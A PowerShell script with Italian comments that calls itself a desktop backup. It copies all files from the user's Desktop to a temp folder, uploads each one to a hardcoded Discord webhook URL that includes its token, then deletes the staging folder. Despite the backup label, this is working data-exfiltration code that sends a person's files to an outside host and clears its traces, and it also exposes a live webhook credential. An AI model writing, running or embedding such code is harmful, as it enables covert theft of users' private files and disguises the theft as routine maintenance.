# Specifica il percorso del desktop e la cartella temporanea per il backup
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$tempBackupPath = "$env:TEMP\desktop_backup"

# Crea la cartella temporanea per il backup se non esiste
if (-Not (Test-Path -Path $tempBackupPath)) {
    New-Item -Path $tempBackupPath -ItemType Directory
}

# Copia tutti i file dal desktop alla cartella temporanea
Copy-Item -Path "$desktopPath\*" -Destination $tempBackupPath -Recurse -Force

# URL del webhook di Discord
$webhookUrl = "https://discord.com/api/webhooks/1278353141376745472/ebYW2o8JpZuxTZdj4nE2HhJw2ztg3HS3DxX1i7wrYFV6yjb8XA2LsPgp-GzhcfL0AtDb"

# Funzione per caricare i file su Discord tramite webhook
function Upload-ToDiscord {
    param (
        [string]$filePath
    )
    
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }
    
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $bodyLines = @("--$boundary",
                   "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                   "Content-Type: application/octet-stream",
                   "",
                   [System.Convert]::ToBase64String($fileContent),
                   "--$boundary--",
                   "")
    
    $body = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "`r`n")

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
}

# Carica tutti i file dal backup temporaneo al server Discord
Get-ChildItem -Path $tempBackupPath -Recurse | ForEach-Object {
    Upload-ToDiscord -filePath $_.FullName
}

# Rimuove la cartella temporanea di backup
Remove-Item -Path $tempBackupPath -Recurse -Force